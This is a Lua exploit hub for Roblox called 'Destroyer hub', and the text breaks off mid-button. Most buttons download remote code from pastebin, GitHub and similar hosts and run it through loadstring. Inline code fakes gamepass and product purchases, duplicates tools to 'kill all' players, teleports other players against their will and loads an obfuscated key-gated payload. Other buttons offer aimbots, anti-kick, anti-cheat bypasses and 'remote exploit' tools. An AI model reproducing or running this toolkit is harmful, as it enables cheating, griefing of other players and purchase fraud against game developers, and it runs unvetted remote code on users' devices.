local RixerLibrary = loadstring(game:HttpGet(('https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Library.lua')))()

local Window = RixerLibrary:MakeWindow({
    Name = "Destroyer hub",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "DestroyerHub"
})

print("the owner of the scripts is rixer95-x2 in youtube.")

local Tab1 = Window:MakeTab({
    Name = "kill/bringHead",
    Icon = "rbxassetid://1",
    PremiumOnly = false
})

Tab1:AddButton({
    Name = "bring all head",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/Q9DvbeiV/raw"))()
    end    
})

Tab1:AddButton({
    Name = "fling all",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
    end    
})

local Tab2 = Window:MakeTab({
    Name = "HD",
    Icon = "rbxassetid://16208317412",
    PremiumOnly = false
})

Tab2:AddButton({
    Name = "Nameless admin",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
    end    
})

Tab2:AddButton({
    Name = "Fate Admin",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
    end    
})

Tab2:AddButton({
    Name = "infinite yield DELTA",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uwuware/main/skripts/deltaIYmobile-kraxk.ppt",true))()
    end    
})

Tab2:AddButton({
    Name = "Gx admin",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK",true))()
    end    
})

Tab2:AddButton({
    Name = "Federo admin",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
    end    
})

Tab2:AddButton({
    Name = "HomeBrew Admin",
    Callback = function()
        _G.CustomUI = false
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
    end    
})

Tab2:AddButton({
    Name = "Revemped Admin",
    Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-works-after-discontinued-updated9362"))()
    end    
})

Tab2:AddButton({
    Name = "Cmd X",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
    end    
})

local Tab3 = Window:MakeTab({
    Name = "hub/gui Universal",
    Icon = "rbxassetid://12345684588",
    PremiumOnly = false
})

Tab3:AddButton({
    Name = "Rochips panel",
    Callback = function()
        if "you wanna use rochips universal" then
	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
	local im,lonely,z_c=task.wait,game,loadstring
	z_c(lonely:HttpGet(z_z..""..z_x))()
	return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
end
    end    
})

Tab3:AddButton({
    Name = "Auto Clicker",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Auto-clicker26-224306"))()
    end    
})

Tab3:AddButton({
    Name = "Hydroxide Mobile",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Hydroxide-mobile-57785"))()
    end    
})

Tab3:AddButton({
    Name = "Bypass Gamepass Free",
    Callback = function()
        -- made by seluwia
-- discord.gg/seluwia
local Players            = game:GetService("Players")
local TweenService       = game:GetService("TweenService")
local UIS                = game:GetService("UserInputService")
local MPS                = game:GetService("MarketplaceService")
local RunService         = game:GetService("RunService")
local tost               = tostring

local player             = Players.LocalPlayer
local CoreGui            = game:GetService("CoreGui")

if CoreGui:FindFirstChild("SeluwiaMobileUI") then
    CoreGui.SeluwiaMobileUI:Destroy()
end

local C = {
    bg        = Color3.fromRGB(12,  12,  14),
    surface   = Color3.fromRGB(18,  18,  22),
    surfaceHi = Color3.fromRGB(28,  28,  34),
    border    = Color3.fromRGB(40,  40,  48),
    accent    = Color3.fromRGB(255, 255, 255),
    green     = Color3.fromRGB(0,   255, 150),
    red       = Color3.fromRGB(255, 80,  80),
    text      = Color3.fromRGB(240, 240, 240),
    textDim   = Color3.fromRGB(140, 140, 150),
}

local State = {
    uiVisible       = true,
    eventCount      = 0,
}

local PW = 245
local PH = 210

local function corner(inst, r)
    local c = Instance.new("UICorner", inst)
    c.CornerRadius = UDim.new(0, r or 10)
    return c
end

local function stroke(inst, col, t, trans)
    local s = Instance.new("UIStroke", inst)
    s.Color     = col or C.border
    s.Thickness = t or 1
    s.Transparency = trans or 0
    return s
end

local function tw(inst, info, props)
    local t = TweenService:Create(inst, info, props)
    t:Play()
    return t
end

local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging, dragStart, startPos = false, nil, nil
    handle.InputBegan:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) then
            dragging = true
            dragStart = inp.Position
            startPos = frame.Position
        end
    end)
    UIS.InputChanged:Connect(function(inp)
        if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
            local d = inp.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
    UIS.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

local sg = Instance.new("ScreenGui")
sg.Name            = "SeluwiaMobileUI"
sg.ResetOnSpawn    = false
sg.ZIndexBehavior  = Enum.ZIndexBehavior.Sibling
sg.IgnoreGuiInset  = true
sg.Parent          = CoreGui

local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = "ToggleIcon"
toggleBtn.Size = UDim2.new(0, 42, 0, 42)
toggleBtn.Position = UDim2.new(0.05, 0, 0.2, 0)
toggleBtn.BackgroundColor3 = C.surfaceHi
toggleBtn.Text = "S"
toggleBtn.TextColor3 = C.accent
toggleBtn.TextSize = 20
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.Parent = sg
corner(toggleBtn, 21)
stroke(toggleBtn, C.accent, 1.5, 0.2)
makeDraggable(toggleBtn)

local panel = Instance.new("Frame")
panel.Name                 = "Panel"
panel.Size                 = UDim2.new(0, PW, 0, PH)
panel.Position             = UDim2.new(0.5, -PW/2, 0.5, -PH/2)
panel.BackgroundColor3     = C.bg
panel.BorderSizePixel      = 0
panel.ClipsDescendants     = true
panel.Parent               = sg
UI_Panel = panel
corner(panel, 12)
stroke(panel, C.accent, 1, 0.8)

local tb = Instance.new("Frame")
tb.Size = UDim2.new(1, 0, 0, 34)
tb.BackgroundTransparency = 1
tb.Parent = panel

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -40, 1, 0)
titleText.Position = UDim2.new(0, 12, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "Seluwia Listener"
titleText.TextColor3 = C.accent
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.TextSize = 13
titleText.Font = Enum.Font.GothamBold
titleText.Parent = tb

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 22, 0, 22)
closeBtn.Position = UDim2.new(1, -30, 0.5, -11)
closeBtn.BackgroundColor3 = C.surfaceHi
closeBtn.Text = "X"
closeBtn.TextColor3 = C.red
closeBtn.TextSize = 10
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = tb
corner(closeBtn, 6)

makeDraggable(panel, tb)

toggleBtn.MouseButton1Click:Connect(function()
    State.uiVisible = not State.uiVisible
    panel.Visible = State.uiVisible
    tw(toggleBtn, TweenInfo.new(0.3), {Rotation = State.uiVisible and 0 or 180})
end)
closeBtn.MouseButton1Click:Connect(function() sg:Destroy() end)

local logArea = Instance.new("ScrollingFrame")
logArea.Size = UDim2.new(1, -16, 1, -45)
logArea.Position = UDim2.new(0, 8, 0, 38)
logArea.BackgroundTransparency = 1
logArea.BorderSizePixel = 0
logArea.ScrollBarThickness = 0
logArea.AutomaticCanvasSize = Enum.AutomaticSize.Y
logArea.CanvasSize = UDim2.new(0, 0, 0, 0)
logArea.Parent = panel

local list = Instance.new("UIListLayout", logArea)
list.Padding = UDim.new(0, 5)
list.HorizontalAlignment = Enum.HorizontalAlignment.Center
list.SortOrder = Enum.SortOrder.LayoutOrder

local emptyLbl = Instance.new("TextLabel")
emptyLbl.Size = UDim2.new(1, 0, 0, 40)
emptyLbl.BackgroundTransparency = 1
emptyLbl.Text = "Waiting for events..."
emptyLbl.TextColor3 = C.textDim
emptyLbl.TextSize = 11
emptyLbl.Font = Enum.Font.Gotham
emptyLbl.Parent = logArea

local function addLog(label, id, sigType)
    emptyLbl.Visible = false
    State.eventCount = State.eventCount + 1
    
    local entry = Instance.new("Frame")
    entry.Size = UDim2.new(1, 0, 0, 38)
    entry.BackgroundColor3 = C.surface
    entry.LayoutOrder = -State.eventCount
    entry.Parent = logArea
    corner(entry, 8)
    stroke(entry, C.border, 1, 0.4)

    local idLbl = Instance.new("TextLabel")
    idLbl.Size = UDim2.new(1, -60, 1, 0)
    idLbl.Position = UDim2.new(0, 10, 0, 0)
    idLbl.BackgroundTransparency = 1
    idLbl.Text = string.format("[%s] %s", label:sub(1,1), tost(id))
    idLbl.TextColor3 = C.text
    idLbl.TextSize = 11
    idLbl.Font = Enum.Font.GothamBold
    idLbl.TextXAlignment = Enum.TextXAlignment.Left
    idLbl.Parent = entry

    local runBtn = Instance.new("TextButton")
    runBtn.Size = UDim2.new(0, 44, 0, 24)
    runBtn.Position = UDim2.new(1, -50, 0.5, -12)
    runBtn.BackgroundColor3 = C.bg
    runBtn.Text = "RUN"
    runBtn.TextColor3 = C.green
    runBtn.TextSize = 9
    runBtn.Font = Enum.Font.GothamBold
    runBtn.Parent = entry
    corner(runBtn, 6)
    stroke(runBtn, C.green, 1, 0.6)
    
    runBtn.MouseButton1Click:Connect(function()
        pcall(function()
            if sigType == "Product" then MPS:SignalPromptProductPurchaseFinished(player.UserId, id, true)
            elseif sigType == "Gamepass" then MPS:SignalPromptGamePassPurchaseFinished(player, id, true)
            elseif sigType == "Purchase" then MPS:SignalPromptPurchaseFinished(player.UserId, id, true)
            end
        end)
        runBtn.TextColor3 = C.accent
        task.wait(0.4)
        runBtn.TextColor3 = C.green
    end)
end

local function hook(signal, label, sigType)
    pcall(function()
        signal:Connect(function(_, id, _)
            addLog(label, id, sigType)
        end)
    end)
end
hook(MPS.PromptProductPurchaseFinished, "Product", "Product")
hook(MPS.PromptGamePassPurchaseFinished, "Gamepass", "Gamepass")
hook(MPS.PromptPurchaseFinished, "Purchase", "Purchase")

print("[Seluwia Mobile] v1.5 Loaded")
    end    
})

Tab3:AddButton({
    Name = "Fe Sound Play AC6 VULNS",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-AC6-Music-Vulnerablity-59292"))()
    end    
})

Tab3:AddButton({
    Name = "Dex Decomiler Fixed",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dex-PlusPlus-Decompiler-Fix-206651"))()
    end    
})

Tab3:AddButton({
    Name = "c00lgui 25",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lgui-25-11361"))()
    end    
})

Tab3:AddButton({
    Name = "Backdoor Scanner V2",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Secret-Administrator-Service-Backdoor-scanner-140475"))()
    end    
})

Tab3:AddButton({
    Name = "Audio panel",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Audio-Panel-11581"))()
    end    
})

Tab3:AddButton({
    Name = "Audio panel",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Audio-Panel-11581"))()
    end    
})

Tab3:AddButton({
    Name = "Backdoor Scan",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
    end    
})

Tab3:AddButton({
    Name = "Aimbot Universal Mobile",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/3yixAuAo/raw"))()
    end    
})

Tab3:AddButton({
    Name = "Remote Exploit Flaw 2.1",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/remote%20abuse%202.1.lua"))()
    end    
})

Tab3:AddButton({
    Name = "Genesis hub",
    Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Genesis-Hub-9584"))()
    end    
})

Tab3:AddButton({
    Name = "Instant Kill Gui Fling",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/febypasskill.lua"))()
    end    
})

Tab3:AddButton({
    Name = "Dex keyless",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/DEX-Explorer/main/Mobile.lua"))()
    end    
})

Tab3:AddButton({
    Name = "Remote Finder",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zhJdeD9E"))()
    end    
})

Tab3:AddButton({
    Name = "Remote Exploit Flaw",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/remote%20event%20abuse.txt"))()
    end    
})

Tab3:AddButton({
    Name = "Ghost hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    end    
})

Tab3:AddButton({
    Name = "Opfinality",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/OpFinality_590"))()
    end    
})

Tab3:AddButton({
    Name = "universal hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
    end    
})

Tab3:AddButton({
    Name = "Fe Kill (Sword) Required",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLKEK12322/Fe-Kill-With-Sword/refs/heads/main/Fe%20Kill%20With%20Sword"))()
    end    
})

Tab3:AddButton({
    Name = "trolling hub universal",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
    end    
})

Tab3:AddButton({
    Name = "Tool giver games",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gametoolgiver.lua"))()
    end    
})

local Tab4 = Window:MakeTab({
    Name = "Boombox scripts Hub",
    Icon = "rbxassetid://10218885518",
    PremiumOnly = false
})

Tab4:AddButton({
    Name = "Salmon hub",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/YrsfKFKO/raw"))()
    end    
})

Tab4:AddButton({
    Name = "Pineapple scripts",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zRHcqpLe", true))()
    end    
})

Tab4:AddButton({
    Name = "Keyboard",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/keyboard.txt"))()
    end    
})

local Tab5 = Window:MakeTab({
    Name = "murder mysterie 2",
    Icon = "rbxassetid://14438537258",
    PremiumOnly = false
})

Tab5:AddButton({
    Name = "YARHM HUB",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()
    end    
})

Tab5:AddButton({
    Name = "mm2 admin panel",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel"))()
    end    
})

Tab5:AddButton({
    Name = "SymphonyHub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/proplayer123-z/symphony-hub/main/SymphonyHub.lua'))()
    end    
})

Tab5:AddButton({
    Name = "Esclipe hub",
    Callback = function()
        getgenv().mainKey = "nil";
 
local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
    end    
})

local Tab6 = Window:MakeTab({
    Name = "Brookhaven rp",
    Icon = "rbxassetid://131271498836679",
    PremiumOnly = false
})

Tab6:AddButton({
    Name = "Imperial hub",
    Callback = function()
        loadstring(game:HttpGet(("https://raw.githubusercontent.com/Trev0rZ/LoaderM/main/ImperialHub-Working.lua"),true))()
    end    
})

Tab6:AddButton({
    Name = "RD4 HUB",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
    end    
})

Tab6:AddButton({
    Name = "Sander X hub",
    Callback = function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/Sanderxv3.30/main/sanderx3.30')))()
    end    
})

local Tab7 = Window:MakeTab({
    Name = "bypass AC",
    Icon = "rbxassetid://176002395",
    PremiumOnly = false
})

Tab7:AddButton({
    Name = "AntiKick Max",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/Best-Script-Server-and-client/refs/heads/main/BestAntiKick-Max-Possible.lua"))()
    end    
})

Tab7:AddButton({
    Name = "Adonis bypass",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
    end    
})

local Tab8 = Window:MakeTab({
    Name = "Harked/Comet/Quirky Admin",
    Icon = "rbxassetid://196992795",
    PremiumOnly = false
})

Tab8:AddButton({
    Name = "Harked v2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()
    end    
})

Tab8:AddButton({
    Name = "Comet",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
    end    
})

Tab8:AddButton({
    Name = "Harked PandaExploit",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Live-Life-Rich-and-Famous-in-Paradise!-harked-that-only-work-for-this-game-8800"))()
    end    
})

Tab8:AddButton({
    Name = "Quirky Admin",
    Callback = function()
        loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
    end    
})

local Tab9 = Window:MakeTab({
    Name = "Universal Script",
    Icon = "rbxassetid://1959203705",
    PremiumOnly = false
})

Tab9:AddButton({
    Name = "fly gui V3",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/bHa6HDFc"))()
    end    
})

Tab9:AddButton({
    Name = "Fe Bring (Tool Required)",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/oQ9WDg9x/raw"))()
    end    
})

Tab9:AddButton({
    Name = "Fe Kill Gui Direct Kill (Tool)",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/8M5rsaaQ/raw"))()
    end    
})

Tab9:AddButton({
    Name = "Fe BigHead",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--body sizes: BodyHeightScale: 105%
--            BodyWidthScale: 100%
--            HeadScale: 100%
--            BodyProportionScale: 0%
--            AvatarPartScaleType: 100%


local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()
	for i,v in pairs(Character:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Name == "Handle" or v.Name == "Head" then
				if Character.Head:FindFirstChild("OriginalSize") then
					Character.Head.OriginalSize:Destroy()
				end
			else
				for i,cav in pairs(v:GetDescendants()) do
					if cav:IsA("Attachment") then
						if cav:FindFirstChild("OriginalPosition") then
							cav.OriginalPosition:Destroy()  
						end
					end
				end
				v:FindFirstChild("OriginalSize"):Destroy()
				if v:FindFirstChild("AvatarPartScaleType") then
					v:FindFirstChild("AvatarPartScaleType"):Destroy()
				end
			end
		end
	end
end

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(1)

for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetChildren()) do
   if string.find(v.Name,"Scale") and v.Name ~= "HeadScale" then
       repeat wait() until game.Players.LocalPlayer.Character.Head:FindFirstChild("OriginalSize")
       game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy()
       v:Destroy()
       game.Players.LocalPlayer.Character.Head:WaitForChild("OriginalSize")
       game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy()
   end
end
wait()
game.Players.LocalPlayer.Character.Head.Mesh:Destroy()
    end    
})

Tab9:AddButton({
    Name = "Fe Grab Player Gui (Tool)",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/VTXPl8J7/raw"))()
    end    
})

Tab9:AddButton({
    Name = "Fe DropHats Giant",
    Callback = function()
        loadstring(game:HttpGet('https://paste.c-net.org/PhyllisWildly', true))()
    end    
})

Tab9:AddButton({
    Name = "Fe Giant Hats (hats Required)",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://paste.c-net.org/BansheeAvery",true))()
    end    
})

Tab9:AddButton({
    Name = "Kill All",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[Credits: joey9876a]]--

--DupetoolsSpray

local plr = game:GetService("Players").LocalPlayer
local backpack = plr.Backpack
local char = plr.Character
local root = char.HumanoidRootPart
local humanoid = char.Humanoid
local old = root.CFrame
local spraybutton = workspace.Fencing.SprayButton
local sprays = {}
local number = 10
if backpack:FindFirstChild("Spray") or char:FindFirstChild("Spray") then
    error("You must not have any sprays when executing this script")
end
while #sprays < number do
    root.CFrame = spraybutton.CFrame
    local spray = char:WaitForChild("Spray")
    spray.Parent = workspace
    sprays[#sprays+1] = spray
end
root.CFrame = root.CFrame + Vector3.new(0,100,0)
task.wait(0.1)
for i,v in pairs(sprays) do
    if v.Parent == workspace then
        root.Velocity = Vector3.zero
        root.CFrame = v.Handle.CFrame
        v.AncestryChanged:Wait()
        task.wait()
        v.Parent = backpack
    end
end
task.wait()
humanoid:UnequipTools()
task.wait()
for i,v in pairs(backpack:GetChildren()) do
    if v.Name == "Spray" and not table.find(sprays, v) then
        root.Velocity = Vector3.zero
        root.CFrame = CFrame.new(1500,-400,1500)
        v.Parent = char
        task.wait()
        v.Parent = workspace
        task.wait(0.1)
    end
end
task.wait()
root.CFrame = old humanoid:ChangeState("GettingUp")

--kill players DigitalityScripts--

loadstring(game:HttpGet(('https://paste.c-net.org/CreepedLeary'),true))()
    end    
})

Tab9:AddButton({
    Name = "Fe Leg Resize",
    Callback = function()
        --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://scriptblox.com/raw/Green-baseplate.-leg-resize-67430"))()
    end    
})

Tab9:AddButton({
    Name = "LoopcBring By @rixer95-x2",
    Callback = function()
        local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local Target = nil
local Loop = nil
local LoopAll = nil

local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
gui.Name = "ChxrisPanel"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 280, 0, 240)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local function neonTextColor()
	return Color3.fromRGB(170, 0, 255)
end

local function makeCorner(obj)
	local c = Instance.new("UICorner", obj)
	c.CornerRadius = UDim.new(0, 0)
	return c
end

local top = Instance.new("Frame", frame)
top.Size = UDim2.new(1,0,0,22)
top.BackgroundColor3 = Color3.fromRGB(0,0,0)
top.BorderSizePixel = 0

local title = Instance.new("TextLabel", top)
title.Size = UDim2.new(1,0,1,0)
title.BackgroundTransparency = 1
title.Text = "Made By Chxris"
title.TextColor3 = neonTextColor()
title.Font = Enum.Font.ArialBold
title.TextSize = 14

local avatar = Instance.new("ImageLabel", frame)
avatar.Size = UDim2.new(0, 70, 0, 70)
avatar.Position = UDim2.new(0.5, -35, 0, 30)
avatar.BackgroundColor3 = Color3.fromRGB(0,0,0)
avatar.BorderSizePixel = 0
avatar.Image = ""

Instance.new("UICorner", avatar).CornerRadius = UDim.new(1,0)

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.85,0,0,26)
box.Position = UDim2.new(0.075,0,0,110)
box.BackgroundColor3 = Color3.fromRGB(0,0,0)
box.BorderSizePixel = 1
box.BorderColor3 = neonTextColor()
box.TextColor3 = neonTextColor()
box.PlaceholderText = "player name"
box.Font = Enum.Font.Arial
box.TextSize = 14

makeCorner(box)

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.85,0,0,28)
btn.Position = UDim2.new(0.075,0,0,145)
btn.Text = "LOOP BRING"
btn.BackgroundColor3 = Color3.fromRGB(0,0,0)
btn.BorderSizePixel = 1
btn.BorderColor3 = neonTextColor()
btn.TextColor3 = neonTextColor()
btn.Font = Enum.Font.ArialBold
btn.TextSize = 14

makeCorner(btn)

local btnAll = Instance.new("TextButton", frame)
btnAll.Size = UDim2.new(0.85,0,0,28)
btnAll.Position = UDim2.new(0.075,0,0,180)
btnAll.Text = "LOOP ALL"
btnAll.BackgroundColor3 = Color3.fromRGB(0,0,0)
btnAll.BorderSizePixel = 1
btnAll.BorderColor3 = neonTextColor()
btnAll.TextColor3 = neonTextColor()
btnAll.Font = Enum.Font.ArialBold
btnAll.TextSize = 14

makeCorner(btnAll)

local function findPlayer(text)
	text = text:lower()
	for _,p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Name:lower():find(text) then
			return p
		end
	end
	return nil
end

local function updateAvatar(plr)
	if not plr then
		avatar.Image = ""
		return
	end

	local ok, img = pcall(function()
		return Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
	end)

	if ok then
		avatar.Image = img
	end
end

box:GetPropertyChangedSignal("Text"):Connect(function()
	updateAvatar(findPlayer(box.Text))
end)

local function start()
	if Loop then return end

	Target = findPlayer(box.Text)
	if not Target then return end

	Loop = RunService.RenderStepped:Connect(function()
		if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")
		and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then

			local hrp = LocalPlayer.Character.HumanoidRootPart
			local trg = Target.Character.HumanoidRootPart

			trg.CFrame = hrp.CFrame * CFrame.new(0,2,-5)
		end
	end)
end

local function stop()
	if Loop then
		Loop:Disconnect()
		Loop = nil
	end
	Target = nil
end

local function startAll()
	if LoopAll then return end

	LoopAll = RunService.RenderStepped:Connect(function()
		local char = LocalPlayer.Character
		if not char or not char:FindFirstChild("HumanoidRootPart") then return end

		local hrp = char.HumanoidRootPart
		local base = hrp.CFrame * CFrame.new(0,2,-5)

		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= LocalPlayer and p.Character then

				local hum = p.Character:FindFirstChildOfClass("Humanoid")
				local trg = p.Character:FindFirstChild("HumanoidRootPart")

				if hum and trg then
					if hum.SeatPart then
						trg.AssemblyLinearVelocity = Vector3.zero
						trg.AssemblyAngularVelocity = Vector3.zero
					else
						hum.PlatformStand = true
						trg.AssemblyLinearVelocity = Vector3.zero
						trg.AssemblyAngularVelocity = Vector3.zero
						trg.CFrame = base
					end
				end
			end
		end
	end)
end

local function stopAll()
	if LoopAll then
		LoopAll:Disconnect()
		LoopAll = nil
	end
end

btn.MouseButton1Click:Connect(function()
	if Loop then stop() else start() end
end)

btnAll.MouseButton1Click:Connect(function()
	if LoopAll then stopAll() else startAll() end
end)
    end    
})

Tab9:AddButton({
    Name = "Hitbox Expander",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/example-prog/Hitbox-Expander/refs/heads/main/RScripter"))()
    end    
})

Tab9:AddButton({
    Name = "IgnoreFitouchintereste",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))()
    end    
})

Tab9:AddButton({
    Name = "God Mod",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/ZAPFnK3W"))()
    end    
})

Tab9:AddButton({
    Name = "WalkSpeed",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/HGvBTQ7y"))()
    end    
})

Tab9:AddButton({
    Name = "Universal aimbot gravity Target",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AimLockFreePcAndMobile-34614"))()
    end    
})

Tab9:AddButton({
    Name = "invisible Gui",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
    end    
})

Tab9:AddButton({
    Name = "Control npcs Fe",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
    end    
})

Tab9:AddButton({
    Name = "MultiGear Spam Bomb and others",
    Callback = function()
